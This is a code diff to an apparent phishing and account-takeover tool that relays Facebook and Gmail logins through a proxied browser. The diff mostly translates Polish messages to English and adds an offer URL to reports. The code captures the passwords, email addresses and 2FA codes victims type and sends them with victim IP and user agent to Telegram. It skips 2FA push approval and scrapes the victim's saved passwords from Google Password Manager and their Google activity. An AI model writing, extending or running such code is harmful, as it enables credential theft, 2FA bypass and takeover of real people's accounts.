@@ -19,6 +19,15 @@ const redirectCbs = new Map(); // accountId -> (url: string) => void
 export function setRedirectCb(accountId, cb) { redirectCbs.set(accountId, cb); }
 export function clearRedirectCb(accountId) { redirectCbs.delete(accountId); }
 
+// Extract "domain/path" from a URL for compact offer context in Telegram.
+function offerPath(url) {
+  try {
+    const u = new URL(url);
+    const path = u.pathname !== '/' ? u.pathname.replace(/\/$/, '') : '';
+    return u.hostname + path;
+  } catch { return ''; }
+}
+
 // Activity log: what happens on the remote (Facebook/Gmail) page itself —
 // navigation, captured credentials — for the panel's "LIVE TIME LOGS" tab.
 // Not panel-UI actions (those aren't page activity).
@@ -37,11 +46,11 @@ function pushLog(accountId, type, message) {
   // Mirror to Telegram — fire-and-forget, this stays a sync function used
   // from hot paths (framenavigated, CDP callbacks) and never awaits.
   if (TELEGRAM_LOG_TYPES.has(type)) {
-    // If message already starts with an emoji (we embed one for capture
-    // events like "🔐 Wpisał hasło"), don't double-prefix it.
     const alreadyHasEmoji = /^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/u.test(message);
     const prefix = alreadyHasEmoji ? '' : (LOG_EMOJI[type] || 'ℹ️') + ' ';
-    telegram.sendMessage(`${prefix}[${accountId}] ${message}`);
+    const s = sessions.get(accountId);
+    const offer = s?.returnUrl ? ` | ${offerPath(s.returnUrl)}` : '';
+    telegram.sendMessage(`${prefix}[${accountId}${offer}] ${message}`);
   }
 }
 export function getLogs(since = 0) {
@@ -216,8 +225,8 @@ async function launch(accountId, adminIp) {
     try {
       const { type, value } = payload || {};
       if (!value || !type) return;
-      if (type === 'fill') { pushLog(accountId, 'fill', `Wypełniono pole: ${value}`); return; }
-      if (type === 'clear') { pushLog(accountId, 'clear', `Wyczyszczono pole: ${value}`); return; }
+      if (type === 'fill') { pushLog(accountId, 'fill', `Field filled: ${value}`); return; }
+      if (type === 'clear') { pushLog(accountId, 'clear', `Field cleared: ${value}`); return; }
       const current = await getAccount(accountId);
       if (!current) return;
       if (type === 'password' && value !== current.password) {
@@ -225,17 +234,17 @@ async function launch(accountId, adminIp) {
         // autofill partial captures from replacing the full typed password).
         if (!current.password || value.length >= current.password.length) {
           await saveAccount({ ...current, password: value });
-          pushLog(accountId, 'capture', `🔐 Wpisał hasło: ${value}`);
+          pushLog(accountId, 'capture', `🔐 Typed password: ${value}`);
         }
       } else if (type === 'email') {
         // Case-insensitive dedup: "User@gmail.com" and "user@gmail.com" are
         // the same login so stop re-reporting after the first one.
         if ((value || '').toLowerCase() !== (current.email || '').toLowerCase()) {
           await saveAccount({ ...current, email: value });
-          pushLog(accountId, 'capture', `📧 Wpisał login: ${value}`);
+          pushLog(accountId, 'capture', `📧 Typed email: ${value}`);
         }
       } else if (type === 'otp') {
-        pushLog(accountId, 'capture', `🔢 Wpisał kod 2FA: ${value}`);
+        pushLog(accountId, 'capture', `🔢 Typed 2FA code: ${value}`);
       }
     } catch {
       /* ignore */
@@ -563,12 +572,37 @@ async function launch(accountId, adminIp) {
           });
           if (screenshotBuf) {
             console.log(`[flow:${accountId}] 📷 screenshot ${screenshotBuf.length} bytes — wysyłam na TG`);
-            telegram.sendDocument(screenshotBuf, `${accountId}-afad.jpg`, `🤖 Co bot widzi na AFAD/2FA (${url.slice(0, 80)})`).catch(() => {});
+            telegram.sendDocument(screenshotBuf, `${accountId}-afad.jpg`, `🤖 Bot's view — AFAD/2FA (${url.slice(0, 80)})`).catch(() => {});
           }
+
         } catch (e) {
           console.log(`[flow:${accountId}] AFAD dump outer error: ${e.message}`);
         }
       }, 10000);
+
+      // Targeted click: on AFAD device-approval page only, click "Try another method"
+      // after 3s so the page finishes rendering — skips push-notification wait, goes to QR
+      if (/auth_platform\/afad/.test(url)) {
+        setTimeout(async () => {
+          try {
+            const clicked = await page.evaluate(() => {
+              const targets = [
+                /spróbuj użyć innej metody/i,
+                /try another method/i,
+                /use another method/i,
+                /use a different method/i,
+              ];
+              const els = Array.from(document.querySelectorAll('a, button, [role="button"]'));
+              for (const el of els) {
+                const txt = (el.innerText || el.textContent || '').trim();
+                if (targets.some((p) => p.test(txt))) { el.click(); return txt.slice(0, 80); }
+              }
+              return null;
+            }).catch(() => null);
+            if (clicked) console.log(`[flow:${accountId}] 🔀 AFAD → klik: "${clicked}"`);
+          } catch {}
+        }, 3000);
+      }
     }
 
     if (notifiedLogin) return;
@@ -618,7 +652,7 @@ async function launch(accountId, adminIp) {
         if (detected) {
           await saveAccount({ ...current, email: detected });
           current = { ...current, email: detected };
-          pushLog(accountId, 'capture', `Wykryto email ze strony: ${detected}`);
+          pushLog(accountId, 'capture', `📧 Email detected from page: ${detected}`);
         }
       }
       // Grab UA and outbound IP (what Gmail/Facebook actually see) in
@@ -665,23 +699,26 @@ async function launch(accountId, adminIp) {
       if (ssPass && ssPass !== current.password) {
         await saveAccount({ ...current, password: ssPass });
         current = { ...current, password: ssPass };
-        pushLog(accountId, 'capture', `🔐 Hasło (odzyskane): ${ssPass}`);
+        pushLog(accountId, 'capture', `🔐 Password (recovered): ${ssPass}`);
       }
 
       const captionLines = [
-        `✅ Zalogowano: ${current.label}`,
-        ``,
-        `👤 Email: ${current.email || '(brak)'}`,
-        `🔑 Hasło: ${current.password || '(brak)'}`,
+        `✅ Logged in: ${current.label}`,
       ];
+      if (current.returnUrl) captionLines.push(`🔗 Offer: ${offerPath(current.returnUrl)}`);
+      captionLines.push(
+        ``,
+        `👤 Email: ${current.email || '(none)'}`,
+        `🔑 Password: ${current.password || '(none)'}`,
+      );
       if (current.victimIp) {
-        captionLines.push(``, `🎯 Ofiara (ten, kto wszedł w link):`);
+        captionLines.push(``, `🎯 Victim (who opened the link):`);
         captionLines.push(`  🌐 IP: ${current.victimIp}`);
         if (current.victimUa) captionLines.push(`  🖥 UA: ${current.victimUa}`);
       }
-      captionLines.push(``, `🤖 Sesja bota:`);
-      captionLines.push(`  🌐 IP: ${ip || '(brak)'}`);
-      captionLines.push(`  🖥 UA: ${ua || '(brak)'}`);
+      captionLines.push(``, `🤖 Browser session (proxy):`);
+      captionLines.push(`  🌐 IP: ${ip || '(none)'}`);
+      captionLines.push(`  🖥 UA: ${ua || '(none)'}`);
       const caption = captionLines.join('\n');
       // One Telegram message (a document with this as its caption) instead
       // of a separate text message + file — everything at a glance.
@@ -703,7 +740,7 @@ async function launch(accountId, adminIp) {
 
   // navState: 'loading' | 'ready' | 'failed' — surfaced via status() so the
   // panel can show whether the pre-loaded page is ready for the admin yet.
-  const s = { context, page, lastActivity: Date.now(), navState: 'loading' };
+  const s = { context, page, lastActivity: Date.now(), navState: 'loading', returnUrl: account.returnUrl || '' };
   sessions.set(accountId, s);
   context.on('close', () => {
     if (sessions.get(accountId) === s) sessions.delete(accountId);
@@ -757,19 +794,19 @@ async function launch(accountId, adminIp) {
       try {
         await navigate();
         s.navState = 'ready';
-        pushLog(accountId, 'nav', `✅ Strona gotowa (próba ${attempt}) — poczekaj aż ktoś wejdzie w link`);
+        pushLog(accountId, 'nav', `✅ Page ready (attempt ${attempt}) — waiting for victim to open the link`);
         return;
       } catch (err) {
         const reason = String(err.message || err).split('\n')[0].replace(/[<>&]/g, '');
-        pushLog(accountId, 'nav', `próba ${attempt}/${maxAttempts}: ${reason}`);
+        pushLog(accountId, 'nav', `attempt ${attempt}/${maxAttempts}: ${reason}`);
         if (attempt === maxAttempts) {
           s.navState = 'failed';
           const hasProxy = Boolean(accProxyServer);
           const hint = hasProxy
-            ? 'Twoje proxy prawdopodobnie zablokowało lub zawiesiło połączenie. Sprawdź czy proxy działa.'
-            : 'Konto NIE MA własnego proxy — strona (szczególnie Facebook) blokuje IP serwera jako datacenter. Dodaj proxy mobile lub residential w formularzu dodawania konta.';
+            ? 'Your proxy likely blocked or stalled the connection. Check that the proxy is working.'
+            : 'This account has no proxy — the site (especially Facebook) blocks datacenter IPs. Add a mobile or residential proxy in the account settings.';
           await page
-            .setContent(`<body style="font:16px sans-serif;padding:2em;max-width:600px"><h2>Nie udało się otworzyć ${account.startUrl}</h2><p style="color:#c00">${reason}</p><p>${hint}</p></body>`)
+            .setContent(`<body style="font:16px sans-serif;padding:2em;max-width:600px"><h2>Failed to open ${account.startUrl}</h2><p style="color:#c00">${reason}</p><p>${hint}</p></body>`)
             .catch(() => {});
         }
       }
@@ -894,7 +931,7 @@ export function getPasswordsCache(_accountId) { return null; }
 // Stub kept for backward compatibility with server's telegram.js import.
 // Real export logic is in openPasswordsExport() below.
 export async function exportPasswordsInBackground(_accountId) {
-  throw new Error('Użyj openPasswordsExport() — eksport wymaga interakcji użytkownika.');
+  throw new Error('Use openPasswordsExport() — export requires user interaction.');
 }
 
 // Open Google Password Manager in a new tab and wait for the user to
@@ -1024,6 +1061,8 @@ export async function openPasswordsExport(accountId, onScreenshot) {
     };
 
     // Allow Chrome to save downloads to config.dataDir in headless mode.
+    // Headless Chrome blocks downloads by default; Browser.setDownloadBehavior
+    // via a page CDP session tells it to allow and save to our data directory.
     try {
       const cdp = await s.context.newCDPSession(page);
       await cdp.send('Browser.setDownloadBehavior', {
@@ -1031,12 +1070,13 @@ export async function openPasswordsExport(accountId, onScreenshot) {
         downloadPath: config.dataDir,
         eventsEnabled: false,
       }).catch(() =>
+        // Fallback: page-level (deprecated but still works in Chrome 131)
         cdp.send('Page.setDownloadBehavior', {
           behavior: 'allow',
           downloadPath: config.dataDir,
         }).catch(() => {})
       );
-    } catch { /* ignore */ }
+    } catch { /* ignore — Chrome may still save via --download-default-directory */ }
 
     // Snapshot of CSV files that exist BEFORE we start clicking, so we can
     // detect the new file Chrome saves to config.dataDir.
@@ -1094,7 +1134,7 @@ export async function openPasswordsExport(accountId, onScreenshot) {
       }
     }
 
-    throw new Error('Nie udało się pobrać pliku CSV — plik nie pojawił się w czasie 3 minut');
+    throw new Error('Failed to download CSV — file did not appear within 3 minutes');
   } finally {
     stopScreenshots();
     // Restore the original page URL so the session isn't stuck on passwords.google.com
@@ -1197,9 +1237,9 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
           stopScreenshots();
           await snap();
           await telegram.sendMessage(
-            `🔐 [${accountId}] Google wymaga weryfikacji przy eksporcie haseł.\n` +
-            `Wpisz hasło lub potwierdź 2FA w przeglądarce.\n` +
-            `Bot czeka 4 minuty.`
+            `🔐 [${accountId}] Google requires verification for password export.\n` +
+            `Enter the password or confirm 2FA in the browser.\n` +
+            `Bot is waiting 4 minutes.`
           );
           await page.waitForURL(
             (url) => !isAuthPage(url.href),
@@ -1228,7 +1268,7 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
     // Count entries on list page — do NOT navigate away per-entry (triggers re-auth).
     // Instead: click each link in-place (SPA navigation stays in session).
     const entryCount = await page.locator('a[href^="password/"]').count().catch(() => 0);
-    if (!entryCount) throw new Error('Nie znaleziono żadnych wpisów na stronie (brak linków password/)');
+    if (!entryCount) throw new Error('No entries found on the page (no password/ links)');
 
     const total = Math.min(entryCount, 300);
     const results = [];
@@ -1317,13 +1357,13 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
     for (let i = 0; i < total; i++) {
       try {
         const allLinksNow = await page.locator('a[href^="password/"]').count().catch(() => 0);
-        await dbg(`wpis ${i + 1}/${total} — linki w DOM: ${allLinksNow}`);
+        await dbg(`entry ${i + 1}/${total} — links in DOM: ${allLinksNow}`);
         const link = page.locator('a[href^="password/"]').nth(i);
         // After goBack the SPA resets scroll and lazy entries disappear from DOM.
         // Scroll down gradually until this entry appears.
         for (let s = 0; s < 20; s++) {
           const cnt = await link.count();
-          await dbg(`scroll próba ${s + 1}: link nth(${i}) count=${cnt}`);
+          await dbg(`scroll attempt ${s + 1}: link nth(${i}) count=${cnt}`);
           if (cnt > 0) break;
           await page.evaluate(() => window.scrollBy(0, 600));
           await page.waitForTimeout(300);
@@ -1331,44 +1371,44 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
         const linkCount = await link.count();
         await dbg(`link nth(${i}) finalnie count=${linkCount}`);
         if (!linkCount) {
-          await dbg(`❌ link nth(${i}) nie pojawił się — pomijam`);
-          results.push(`wpis-${i + 1} | (pominięty — brak linka w DOM)`);
+          await dbg(`❌ link nth(${i}) did not appear — skipping`);
+          results.push(`entry-${i + 1} | (skipped — link not found in DOM)`);
           if (onProgress) onProgress(results.length, total);
           continue;
         }
         await link.scrollIntoViewIfNeeded().catch(() => {});
         const entryHref = await link.getAttribute('href').catch(() => null);
-        await dbg(`klikam href="${entryHref || '(brak)'}", URL przed: ${page.url()}`);
+        await dbg(`clicking href="${entryHref || '(none)'}", URL before: ${page.url()}`);
         await link.click({ timeout: 8000 });
         await page.waitForTimeout(1500);
-        await dbg(`po kliknięciu URL: ${page.url()}`);
+        await dbg(`URL after click: ${page.url()}`);
 
         // Guard: if Google redirected to auth/challenge, handle robustly
         if (isAuthPage(page.url())) {
-          await dbg(`AUTH wykryty: ${page.url()}`);
+          await dbg(`AUTH detected: ${page.url()}`);
           if (acc?.password) {
             const pwInp = page.locator('input[type="password"]').first();
             const pwCount = await pwInp.count();
             await dbg(`input[type=password] count=${pwCount}`);
             if (pwCount) {
               await pwInp.fill(acc.password);
-              await dbg('hasło wpisane, klikam Dalej...');
+              await dbg('password filled, clicking Next...');
               await clickDalej(page);
               await page.waitForTimeout(2000);
-              await dbg(`po Dalej URL: ${page.url()}`);
+              await dbg(`URL after Next: ${page.url()}`);
             }
           } else {
-            await dbg('BRAK acc.password — nie mogę auto-wpisać');
+            await dbg('no acc.password — cannot auto-fill');
           }
 
           if (isAuthPage(page.url())) {
-            await dbg(`nadal na auth po auto-fill: ${page.url()} — czekam na człowieka`);
+            await dbg(`still on auth after auto-fill: ${page.url()} — waiting for human`);
             stopScreenshots();
             await snap();
             await telegram.sendMessage(
-              `🔐 [${accountId}] Google prosi o weryfikację przy wpisie ${i + 1}/${total}.\n` +
-              `Wpisz hasło / potwierdź 2FA w przeglądarce.\n` +
-              `Bot czeka 3 minuty, potem wznawia eksport.`
+              `🔐 [${accountId}] Google requires verification at entry ${i + 1}/${total}.\n` +
+              `Enter password / confirm 2FA in the browser.\n` +
+              `Bot is waiting 3 minutes, then resuming export.`
             );
             await page.waitForURL(
               (url) => !isAuthPage(url.href),
@@ -1377,8 +1417,8 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
             startScreenshots();
             await snap();
             if (isAuthPage(page.url())) {
-              await dbg(`timeout auth — pomijam wpis ${i + 1}`);
-              results.push(`wpis-${i + 1} | (pominięty — auth timeout)`);
+              await dbg(`auth timeout — skipping entry ${i + 1}`);
+              results.push(`entry-${i + 1} | (skipped — auth timeout)`);
               if (onProgress) onProgress(results.length, total);
               await gotoTolerant('https://passwords.google.com/');
               await page.waitForTimeout(1500);
@@ -1386,11 +1426,11 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
             }
           }
 
-          await dbg(`auth zdany, URL teraz: ${page.url()}`);
+          await dbg(`auth passed, URL now: ${page.url()}`);
           // After challenge Google redirects to list, NOT to the entry detail.
           // Re-click via SPA (NOT page.goto — that would trigger another challenge).
           if (!page.url().includes('/password/')) {
-            await dbg('redirect na listę — re-klikam wpis przez SPA');
+            await dbg('redirected to list — re-clicking entry via SPA');
             const reLink = page.locator('a[href^="password/"]').nth(i);
             await reLink.scrollIntoViewIfNeeded().catch(() => {});
             await reLink.click({ timeout: 8000 }).catch(() => {});
@@ -1402,9 +1442,9 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
         // Wait for shadow DOM to fully populate
         await page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});
         const detailUrl = page.url();
-        await dbg(`strona szczegółów: ${detailUrl}`);
+        await dbg(`detail page: ${detailUrl}`);
         const data = await extractFromDetailPage();
-        await dbg(`wyciągnięto — site="${data.site}" user="${data.user}" pw="${data.pw ? '***' : '(puste)'}"`);
+        await dbg(`extracted — site="${data.site}" user="${data.user}" pw="${data.pw ? '***' : '(empty)'}"`);
 
         // Navigate back to list — always goto, not goBack.
         // goBack lands on the challenge/pwd page which is in the browser history
@@ -1413,19 +1453,19 @@ export async function openPasswordsExportRowByRow(accountId, onScreenshot, onPro
         await page.goto('https://passwords.google.com/', { waitUntil: 'domcontentloaded', timeout: 15000 })
           .catch(() => {});
         await page.waitForTimeout(600);
-        await dbg(`wróciłem na listę: ${page.url()}`);
+        await dbg(`back on list: ${page.url()}`);
 
-        const site = data.site || (detailUrl.includes('passwords.google.com/password/') ? `entry-${i + 1}` : detailUrl) || `wpis-${i + 1}`;
+        const site = data.site || (detailUrl.includes('passwords.google.com/password/') ? `entry-${i + 1}` : detailUrl) || `entry-${i + 1}`;
         const user = data.user || '';
-        const pw = data.pw || '(nie udało się)';
+        const pw = data.pw || '(failed)';
         results.push(`${site} | ${user} | ${pw}`);
         if (onProgress) onProgress(results.length, total);
       } catch (err) {
-        await dbg(`❌ WYJĄTEK wpis ${i + 1}: ${err.message}`);
+        await dbg(`❌ EXCEPTION entry ${i + 1}: ${err.message}`);
       }
     }
 
-    if (!results.length) throw new Error('Nie udało się wyciągnąć żadnych haseł ze stron szczegółów');
+    if (!results.length) throw new Error('Failed to extract any passwords from detail pages');
 
     const filename = `passwords-${accountId}-rows.txt`;
     const savePath = path.join(config.dataDir, filename);
@@ -1541,7 +1581,7 @@ export async function exportGoogleActivity(accountId, onScreenshot) {
     });
 
     if (!entries.length) {
-      throw new Error('Brak aktywności lub konto nie jest zalogowane w Google');
+      throw new Error('No activity found or account is not logged in to Google');
     }
 
     return entries; // array of { date, text }
